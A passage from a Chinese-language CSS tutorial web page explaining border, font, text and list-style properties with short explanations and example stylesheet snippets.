class="line">    <span class="attribute">border-bottom-color</span>: <span class="number">#00cc66</span>;</span><br><span class="line">    <span class="attribute">border-left-color</span>: <span class="number">#6600cc</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="border-width"><a href="#border-width" class="headerlink" title="border-width"></a>border-width</h4><p><strong>详细解释：</strong></p>
<ul>
<li>设置边框的宽度</li>
<li>可以为四条边设置不同宽度</li>
<li>语法：<code>border-width: [上] [右] [下] [左];</code></li>
<li>常用单位：px、em、rem等</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 所有边框相同宽度 */</span></span><br><span class="line"><span class="selector-class">.all-same</span> &#123;</span><br><span class="line">    <span class="attribute">border-width</span>: <span class="number">2px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 上下相同，左右相同 */</span></span><br><span class="line"><span class="selector-class">.top-bottom</span> &#123;</span><br><span class="line">    <span class="attribute">border-width</span>: <span class="number">1px</span> <span class="number">3px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 四条边各不相同 */</span></span><br><span class="line"><span class="selector-class">.four-different</span> &#123;</span><br><span class="line">    <span class="attribute">border-width</span>: <span class="number">1px</span> <span class="number">2px</span> <span class="number">3px</span> <span class="number">4px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 分别设置每条边 */</span></span><br><span class="line"><span class="selector-class">.specific</span> &#123;</span><br><span class="line">    <span class="attribute">border-top-width</span>: <span class="number">1px</span>;</span><br><span class="line">    <span class="attribute">border-right-width</span>: <span class="number">2px</span>;</span><br><span class="line">    <span class="attribute">border-bottom-width</span>: <span class="number">3px</span>;</span><br><span class="line">    <span class="attribute">border-left-width</span>: <span class="number">4px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="border-style"><a href="#border-style" class="headerlink" title="border-style"></a>border-style</h4><p><strong>详细解释：</strong></p>
<ul>
<li>设置边框的样式</li>
<li>可以为四条边设置不同样式</li>
<li>语法：<code>border-style: [上] [右] [下] [左];</code></li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 所有边框相同样式 */</span></span><br><span class="line"><span class="selector-class">.all-same</span> &#123;</span><br><span class="line">    <span class="attribute">border-style</span>: solid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 上下相同，左右相同 */</span></span><br><span class="line"><span class="selector-class">.top-bottom</span> &#123;</span><br><span class="line">    <span class="attribute">border-style</span>: dashed dotted;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 四条边各不相同 */</span></span><br><span class="line"><span class="selector-class">.four-different</span> &#123;</span><br><span class="line">    <span class="attribute">border-style</span>: solid dashed dotted double;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 分别设置每条边 */</span></span><br><span class="line"><span class="selector-class">.specific</span> &#123;</span><br><span class="line">    <span class="attribute">border-top-style</span>: solid;</span><br><span class="line">    <span class="attribute">border-right-style</span>: dashed;</span><br><span class="line">    <span class="attribute">border-bottom-style</span>: dotted;</span><br><span class="line">    <span class="attribute">border-left-style</span>: double;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="单独边框属性"><a href="#单独边框属性" class="headerlink" title="单独边框属性"></a>单独边框属性</h4><p><strong>详细解释：</strong></p>
<ul>
<li>可以单独设置某条边的边框</li>
<li>包括：<code>border-top</code>、<code>border-right</code>、<code>border-bottom</code>、<code>border-left</code></li>
<li>每个属性都可以设置宽度、样式和颜色</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 设置上边框 */</span></span><br><span class="line"><span class="selector-class">.border-top</span> &#123;</span><br><span class="line">    <span class="attribute">border-top</span>: <span class="number">2px</span> solid <span class="number">#0066cc</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 设置右边框 */</span></span><br><span class="line"><span class="selector-class">.border-right</span> &#123;</span><br><span class="line">    <span class="attribute">border-right</span>: <span class="number">1px</span> dashed <span class="number">#cc0000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 设置下边框 */</span></span><br><span class="line"><span class="selector-class">.border-bottom</span> &#123;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="number">3px</span> double <span class="number">#00cc66</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 设置左边框 */</span></span><br><span class="line"><span class="selector-class">.border-left</span> &#123;</span><br><span class="line">    <span class="attribute">border-left</span>: <span class="number">4px</span> groove <span class="number">#6600cc</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 混合使用 */</span></span><br><span class="line"><span class="selector-class">.mixed</span> &#123;</span><br><span class="line">    <span class="attribute">border-top</span>: <span class="number">1px</span> solid <span class="number">#000</span>;</span><br><span class="line">    <span class="attribute">border-right</span>: none;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="number">2px</span> dashed <span class="number">#333</span>;</span><br><span class="line">    <span class="attribute">border-left</span>: <span class="number">1px</span> dotted <span class="number">#666</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="6-2-边框简写"><a href="#6-2-边框简写" class="headerlink" title="6.2 边框简写"></a>6.2 边框简写</h3><p><strong>详细解释：</strong></p>
<ul>
<li>使用<code>border</code>属性可以一次性设置边框的宽度、样式和颜色</li>
<li>语法：<code>border: [宽度] [样式] [颜色];</code></li>
<li>可以针对特定边使用：<code>border-top</code>、<code>border-right</code>等</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 所有边框相同 */</span></span><br><span class="line"><span class="selector-class">.all</span> &#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 设置上边框 */</span></span><br><span class="line"><span class="selector-class">.top</span> &#123;</span><br><span class="line">    <span class="attribute">border-top</span>: <span class="number">2px</span> solid <span class="number">#0066cc</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 设置右边框 */</span></span><br><span class="line"><span class="selector-class">.right</span> &#123;</span><br><span class="line">    <span class="attribute">border-right</span>: <span class="number">1px</span> dashed <span class="number">#cc0000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 设置下边框 */</span></span><br><span class="line"><span class="selector-class">.bottom</span> &#123;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="number">3px</span> double <span class="number">#00cc66</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 设置左边框 */</span></span><br><span class="line"><span class="selector-class">.left</span> &#123;</span><br><span class="line">    <span class="attribute">border-left</span>: <span class="number">4px</span> groove <span class="number">#6600cc</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 混合使用 */</span></span><br><span class="line"><span class="selector-class">.mixed</span> &#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ddd</span>;</span><br><span class="line">    <span class="attribute">border-top</span>: <span class="number">2px</span> solid <span class="number">#0066cc</span>;</span><br><span class="line">    <span class="attribute">border-right</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="7-文字属性"><a href="#7-文字属性" class="headerlink" title="7. 文字属性"></a>7. 文字属性</h2><h3 id="7-1-文字属性详解"><a href="#7-1-文字属性详解" class="headerlink" title="7.1 文字属性详解"></a>7.1 文字属性详解</h3><h4 id="color"><a href="#color" class="headerlink" title="color"></a>color</h4><p><strong>详细解释：</strong></p>
<ul>
<li>设置文本颜色</li>
<li>可以使用颜色名称、十六进制值、RGB值、RGBA值等</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 颜色名称 */</span></span><br><span class="line"><span class="selector-class">.name</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 十六进制值 */</span></span><br><span class="line"><span class="selector-class">.hex</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#0066cc</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* RGB值 */</span></span><br><span class="line"><span class="selector-class">.rgb</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="built_in">rgb</span>(<span class="number">0</span>, <span class="number">102</span>, <span class="number">204</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* RGBA值（带透明度） */</span></span><br><span class="line"><span class="selector-class">.rgba</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">102</span>, <span class="number">204</span>, <span class="number">0.8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 系统颜色 */</span></span><br><span class="line"><span class="selector-class">.system</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: windowtext; <span class="comment">/* 使用系统文本颜色 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="font-size"><a href="#font-size" class="headerlink" title="font-size"></a>font-size</h4><p><strong>详细解释：</strong></p>
<ul>
<li>设置文本的大小</li>
<li>常用单位：px、em、rem、%、pt等</li>
<li>相对单位（em、rem、%）会根据父元素或根元素的字体大小进行缩放</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 像素单位（固定大小） */</span></span><br><span class="line"><span class="selector-class">.px</span> &#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">16px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* em单位（相对于父元素） */</span></span><br><span class="line"><span class="selector-class">.em</span> &#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">1.2em</span>; <span class="comment">/* 1.2 × 父元素字体大小 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* rem单位（相对于根元素） */</span></span><br><span class="line"><span class="selector-class">.rem</span> &#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">1.2rem</span>; <span class="comment">/* 1.2 × &lt;html&gt;元素字体大小 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 百分比（相对于父元素） */</span></span><br><span class="line"><span class="selector-class">.percent</span> &#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">120%</span>; <span class="comment">/* 120% × 父元素字体大小 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 绝对大小关键字 */</span></span><br><span class="line"><span class="selector-class">.keywords</span> &#123;</span><br><span class="line">    <span class="attribute">font-size</span>: large; <span class="comment">/* 或 x-small, small, medium, large, x-large, xx-large */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="font-weight"><a href="#font-weight" class="headerlink" title="font-weight"></a>font-weight</h4><p><strong>详细解释：</strong></p>
<ul>
<li>设置文本的粗细</li>
<li>常用值：<code>normal</code>（400）、<code>bold</code>（700）、<code>bolder</code>、<code>lighter</code>或100-900的数字值</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 关键字 */</span></span><br><span class="line"><span class="selector-class">.keywords</span> &#123;</span><br><span class="line">    <span class="attribute">font-weight</span>: normal; <span class="comment">/* 正常 */</span></span><br><span class="line">    <span class="comment">/* 或 */</span></span><br><span class="line">    <span class="attribute">font-weight</span>: bold; <span class="comment">/* 加粗 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 数字值 */</span></span><br><span class="line"><span class="selector-class">.numbers</span> &#123;</span><br><span class="line">    <span class="attribute">font-weight</span>: <span class="number">400</span>; <span class="comment">/* 正常 */</span></span><br><span class="line">    <span class="comment">/* 或 */</span></span><br><span class="line">    <span class="attribute">font-weight</span>: <span class="number">700</span>; <span class="comment">/* 加粗 */</span></span><br><span class="line">    <span class="comment">/* 或 */</span></span><br><span class="line">    <span class="attribute">font-weight</span>: <span class="number">600</span>; <span class="comment">/* 半粗体 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 相对值 */</span></span><br><span class="line"><span class="selector-class">.relative</span> &#123;</span><br><span class="line">    <span class="attribute">font-weight</span>: bolder; <span class="comment">/* 比父元素更粗 */</span></span><br><span class="line">    <span class="comment">/* 或 */</span></span><br><span class="line">    <span class="attribute">font-weight</span>: lighter; <span class="comment">/* 比父元素更细 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="font-family"><a href="#font-family" class="headerlink" title="font-family"></a>font-family</h4><p><strong>详细解释：</strong></p>
<ul>
<li>设置文本的字体</li>
<li>指定多个字体作为备选，浏览器会使用第一个可用的字体</li>
<li>通常包括一个具体的字体和一个通用字体族</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 单个字体 */</span></span><br><span class="line"><span class="selector-class">.single</span> &#123;</span><br><span class="line">    <span class="attribute">font-family</span>: <span class="string">&quot;Microsoft YaHei&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 多个字体（带备选） */</span></span><br><span class="line"><span class="selector-class">.multiple</span> &#123;</span><br><span class="line">    <span class="attribute">font-family</span>: <span class="string">&quot;Microsoft YaHei&quot;</span>, <span class="string">&quot;Heiti SC&quot;</span>, <span class="string">&quot;SimSun&quot;</span>, sans-serif;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 通用字体族 */</span></span><br><span class="line"><span class="selector-class">.generic</span> &#123;</span><br><span class="line">    <span class="attribute">font-family</span>: serif; <span class="comment">/* 衬线字体 */</span></span><br><span class="line">    <span class="comment">/* 或 */</span></span><br><span class="line">    <span class="attribute">font-family</span>: sans-serif; <span class="comment">/* 无衬线字体 */</span></span><br><span class="line">    <span class="comment">/* 或 */</span></span><br><span class="line">    <span class="attribute">font-family</span>: monospace; <span class="comment">/* 等宽字体 */</span></span><br><span class="line">    <span class="comment">/* 或 */</span></span><br><span class="line">    <span class="attribute">font-family</span>: cursive; <span class="comment">/* 手写体 */</span></span><br><span class="line">    <span class="comment">/* 或 */</span></span><br><span class="line">    <span class="attribute">font-family</span>: fantasy; <span class="comment">/* 装饰字体 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="font-variant"><a href="#font-variant" class="headerlink" title="font-variant"></a>font-variant</h4><p><strong>详细解释：</strong></p>
<ul>
<li>设置文本的变体</li>
<li>常用值：<code>normal</code>、<code>small-caps</code>（小型大写字母）</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 正常文本 */</span></span><br><span class="line"><span class="selector-class">.normal</span> &#123;</span><br><span class="line">    <span class="attribute">font-variant</span>: normal;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 小型大写字母 */</span></span><br><span class="line"><span class="selector-class">.small-caps</span> &#123;</span><br><span class="line">    <span class="attribute">font-variant</span>: small-caps;</span><br><span class="line">    <span class="comment">/* 或 */</span></span><br><span class="line">    <span class="attribute">font-variant</span>: small-caps;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="8-文本属性"><a href="#8-文本属性" class="headerlink" title="8. 文本属性"></a>8. 文本属性</h2><h3 id="8-1-文本属性详解"><a href="#8-1-文本属性详解" class="headerlink" title="8.1 文本属性详解"></a>8.1 文本属性详解</h3><h4 id="text-align"><a href="#text-align" class="headerlink" title="text-align"></a>text-align</h4><p><strong>详细解释：</strong></p>
<ul>
<li>设置文本的水平对齐方式</li>
<li>常用值：<code>left</code>、<code>right</code>、<code>center</code>、<code>justify</code>（两端对齐）</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 左对齐（默认） */</span></span><br><span class="line"><span class="selector-class">.left</span> &#123;</span><br><span class="line">    <span class="attribute">text-align</span>: left;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 右对齐 */</span></span><br><span class="line"><span class="selector-class">.right</span> &#123;</span><br><span class="line">    <span class="attribute">text-align</span>: right;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 居中对齐 */</span></span><br><span class="line"><span class="selector-class">.center</span> &#123;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 两端对齐 */</span></span><br><span class="line"><span class="selector-class">.justify</span> &#123;</span><br><span class="line">    <span class="attribute">text-align</span>: justify;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="line-height"><a href="#line-height" class="headerlink" title="line-height"></a>line-height</h4><p><strong>详细解释：</strong></p>
<ul>
<li>设置行高（行与行之间的垂直间距）</li>
<li>可以使用无单位数值（相对于字体大小的倍数）、长度值或百分比</li>
<li>常用于垂直居中文本</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 无单位数值（推荐） */</span></span><br><span class="line"><span class="selector-class">.unitless</span> &#123;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">1.5</span>; <span class="comment">/* 1.5 × 字体大小 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 长度值 */</span></span><br><span class="line"><span class="selector-class">.length</span> &#123;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">24px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 百分比 */</span></span><br><span class="line"><span class="selector-class">.percent</span> &#123;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">150%</span>; <span class="comment">/* 150% × 字体大小 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 垂直居中（单行文本） */</span></span><br><span class="line"><span class="selector-class">.vertical-center</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">50px</span>; <span class="comment">/* 与容器高度相同 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="text-indent"><a href="#text-indent" class="headerlink" title="text-indent"></a>text-indent</h4><p><strong>详细解释：</strong></p>
<ul>
<li>设置首行缩进</li>
<li>常用单位：px、em、rem、%等</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 像素单位 */</span></span><br><span class="line"><span class="selector-class">.px</span> &#123;</span><br><span class="line">    <span class="attribute">text-indent</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* em单位 */</span></span><br><span class="line"><span class="selector-class">.em</span> &#123;</span><br><span class="line">    <span class="attribute">text-indent</span>: <span class="number">2em</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 百分比（相对于容器宽度） */</span></span><br><span class="line"><span class="selector-class">.percent</span> &#123;</span><br><span class="line">    <span class="attribute">text-indent</span>: <span class="number">5%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 负值（悬挂缩进） */</span></span><br><span class="line"><span class="selector-class">.hanging</span> &#123;</span><br><span class="line">    <span class="attribute">text-indent</span>: -<span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">padding-left</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="text-decoration"><a href="#text-decoration" class="headerlink" title="text-decoration"></a>text-decoration</h4><p><strong>详细解释：</strong></p>
<ul>
<li>设置文本的装饰线</li>
<li>常用值：<code>none</code>、<code>underline</code>、<code>overline</code>、<code>line-through</code>、<code>blink</code></li>
<li>可组合使用</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 无装饰线（默认） */</span></span><br><span class="line"><span class="selector-class">.none</span> &#123;</span><br><span class="line">    <span class="attribute">text-decoration</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 下划线 */</span></span><br><span class="line"><span class="selector-class">.underline</span> &#123;</span><br><span class="line">    <span class="attribute">text-decoration</span>: underline;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 上划线 */</span></span><br><span class="line"><span class="selector-class">.overline</span> &#123;</span><br><span class="line">    <span class="attribute">text-decoration</span>: overline;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 中划线 */</span></span><br><span class="line"><span class="selector-class">.line-through</span> &#123;</span><br><span class="line">    <span class="attribute">text-decoration</span>: line-through;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 组合使用 */</span></span><br><span class="line"><span class="selector-class">.combined</span> &#123;</span><br><span class="line">    <span class="attribute">text-decoration</span>: underline overline;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 指定颜色和样式 */</span></span><br><span class="line"><span class="selector-class">.specific</span> &#123;</span><br><span class="line">    <span class="attribute">text-decoration</span>: underline;</span><br><span class="line">    <span class="attribute">text-decoration-color</span>: red;</span><br><span class="line">    <span class="attribute">text-decoration-style</span>: wavy;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="letter-spacing"><a href="#letter-spacing" class="headerlink" title="letter-spacing"></a>letter-spacing</h4><p><strong>详细解释：</strong></p>
<ul>
<li>设置字间距（字符之间的间距）</li>
<li>可以使用正值（增加间距）或负值（减少间距）</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 增加字间距 */</span></span><br><span class="line"><span class="selector-class">.spaced</span> &#123;</span><br><span class="line">    <span class="attribute">letter-spacing</span>: <span class="number">2px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 减少字间距 */</span></span><br><span class="line"><span class="selector-class">.tight</span> &#123;</span><br><span class="line">    <span class="attribute">letter-spacing</span>: -<span class="number">1px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 相对值 */</span></span><br><span class="line"><span class="selector-class">.relative</span> &#123;</span><br><span class="line">    <span class="attribute">letter-spacing</span>: <span class="number">0.1em</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="9-列表"><a href="#9-列表" class="headerlink" title="9. 列表"></a>9. 列表</h2><h3 id="9-1-列表属性详解"><a href="#9-1-列表属性详解" class="headerlink" title="9.1 列表属性详解"></a>9.1 列表属性详解</h3><h4 id="list-style-type"><a href="#list-style-type" class="headerlink" title="list-style-type"></a>list-style-type</h4><p><strong>详细解释：</strong></p>
<ul>
<li>设置列表项标记的类型</li>
<li>适用于有序列表(ol)和无序列表(ul)</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 无序列表 */</span></span><br><span class="line"><span class="selector-tag">ul</span><span class="selector-class">.disc</span> &#123;</span><br><span class="line">    <span class="attribute">list-style-type</span>: disc; <span class="comment">/* 默认 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">ul</span><span class="selector-class">.circle</span> &#123;</span><br><span class="line">    <span class="attribute">list-style-type</span>: circle;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">ul</span><span class="selector-class">.square</span> &#123;</span><br><span class="line">    <span class="attribute">list-style-type</span>: square;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">ul</span><span class="selector-class">.none</span> &#123;</span><br><span class="line">    <span class="attribute">list-style-type</span>: none; <span class="comment">/* 无标记 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 有序列表 */</span></span><br><span class="line"><span class="selector-tag">ol</span><span class="selector-class">.decimal</span> &#123;</span><br><span class="line">    <span class="attribute">list-style-type</span>: decimal; <span class="comment">/* 默认 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">ol</span><span class="selector-class">.decimal-leading-zero</span> &#123;</span><br><span class="line">    <span class="attribute">list-style-type</span>: decimal-leading-zero;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">ol</span><span class="selector-class">.lower-roman</span> &#123;</span><br><span class="line">    <span class="attribute">list-style-type</span>: lower-roman;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">ol</span><span class="selector-class">.upper-roman</span> &#123;</span><br><span class="line">    <span class="attribute">list-style-type</span>: upper-roman;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">ol</span><span class="selector-class">.lower-alpha</span> &#123;</span><br><span class="line">    <span class="attribute">list-style-type</span>: lower-alpha;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">ol</span><span class="selector-class">.upper-alpha</span> &#123;</span><br><span class="line">    <span class="attribute">list-style-type</span>: upper-alpha;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="list-style-position"><a href="#list-style-position" class="headerlink" title="list-style-position"></a>list-style-position</h4><p><strong>详细解释：</strong></p>
<ul>
<li>设置列表项标记的位置</li>
<li>常用值：<code>inside</code>、<code>outside</code>（默认）</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 标记在文本内部 */</span></span><br><span class="line"><span class="selector-class">.inside</span> &#123;</span><br><span class="line">    <span class="attribute">list-style-position</span>: inside;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 标记在文本外部（默认） */</span></span><br><span class="line"><span class="selector-class">.outside</span> &#123;</span><br><span class="line">    <span class="attribute">list-style-position</span>: outside;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="list-style-image"><a href="#list-style-image" class="headerlink" title="list-style-image"></a>list-style-image</h4><p><strong>详细解释：</strong></p>
<ul>
<li>使用图像代替列表项标记</li>
<li>可以使用URL指定图像路径</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 使用自定义图像作为列表标记 */</span></span><br><span class="line"><span class="selector-class">.custom-marker</span> &#123;</span><br><span class="line">    <span class="attribute">list-style-image</span>: <span class="built_in">url</span>(<span class="string">&quot;custom-bullet.png&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 无图像（回退到list-style-type） */</span></span><br><span class="line"><span class="selector-class">.no-image</span> &#123;</span><br><span class="line">    <span class="attribute">list-style-image</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="list-style-简写"><a href="#list-style-简写" class="headerlink" title="list-style 简写"></a>list-style 简写</h4><p><strong>详细解释：</strong></p>
<ul>
<li>使用<code>list-style</code>属性可以一次性设置列表的所有样式</li>
<li>顺序：<code>list-style: [type] [position] [image];</code></li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 基本简写 */</span></span><br><span class="line"><span class="selector-class">.simple</span> &#123;</span><br><span class="line">    <span class="attribute">list-style</span>: square inside;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 完整简写 */</span></span><br><span class="line"><span class="selector-class">.full</span> &#123;</span><br><span class="line">    <span class="attribute">list-style</span>: square inside <span class="built_in">url</span>(<span class="string">&quot;bullet.png&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 仅设置类型 */</span></span><br><span class="line"><span class="selector-class">.type-only</span> &#123;</span><br><span class="line">    <span class="attribute">list-style</span>: circle;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 仅设置位置 */</span></span><br><span class="line"><span class="selector-class">.position-only</span> &#123;</span><br><span class="line">    <span class="attribute">list-style</span>: inside;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 仅设置图像 */</span></span><br><span class="line"><span class="selector-class">.image-only</span> &#123;</span><br><span class="line">    <span class="attribute">list-style</span>: <span class="built_in">url</span>(<span class="string">&quot;bullet.png&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

